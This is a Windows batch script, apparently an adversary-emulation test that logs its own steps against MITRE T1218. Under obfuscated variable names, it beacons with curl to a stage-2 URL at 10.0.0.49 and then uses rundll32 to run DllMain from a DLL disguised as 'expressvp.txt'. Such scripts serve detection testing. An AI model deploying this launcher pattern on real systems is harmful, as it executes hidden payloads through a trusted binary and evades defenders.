@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET vzmcf=1
SET douyiw=%APPDATA%\7681\99305b7d
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7681-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=expressvp.txt
SET rgnpbq=7681

REM Internal variables (random names)
SET htyulk=%APPDATA%\!fkesh!\macula-simulations.log
SET dwpsqf=T1218
SET jkxtrs=Signed Binary Proxy Execution
SET xvcpnt=rundll32.exe

REM Script start
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: SCRIPT_START=initializing>> "!htyulk!" 2>nul)

REM Heartbeat check (TASK 1)
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: HEARTBEAT_START=!frytcn!>> "!htyulk!" 2>nul)
curl.exe -k -s -o nul "!frytcn!"
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: HEARTBEAT_RESULT=errorlevel=!ERRORLEVEL!>> "!htyulk!" 2>nul)

REM Change to output directory (TASK 3)
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: CHDIR_START=!douyiw!>> "!htyulk!" 2>nul)
cd /d "!douyiw!" 2>nul
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: CHDIR_RESULT=errorlevel=!ERRORLEVEL!>> "!htyulk!" 2>nul)

REM Execute DLL (TASK 4)
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: PROCESS_START=!xvcpnt! "!ecrfwq!",DllMain>> "!htyulk!" 2>nul)
SET vgjpqw=1
SET bqmknx=
!xvcpnt! "!ecrfwq!", DllMain
if !ERRORLEVEL! NEQ 0 (
    SET vgjpqw=0
    SET bqmknx=execution_failed
)
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: PROCESS_RESULT=errorlevel=!ERRORLEVEL!>> "!htyulk!" 2>nul)

REM TTP Logging (MITRE T1218)
SET ymsdtg=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET fhkpjr=!TIME!
IF "!fhkpjr:~1,1!"==":" SET fhkpjr=0!fhkpjr!
SET fhkpjr=!fhkpjr!.000
SET fhkpjr=!fhkpjr:~0,12!
echo [!ymsdtg! !fhkpjr!][!eykalkg!]: !fkesh!-!rgnpbq!-!dwpsqf!|!jkxtrs!=!vgjpqw!:!bqmknx!>> "!htyulk!" 2>nul

REM Script end
if "!vzmcf!"=="1" (echo [!DATE! !TIME!][DEBUG][!eykalkg!]: SCRIPT_END=exit_code=!ERRORLEVEL!>> "!htyulk!" 2>nul)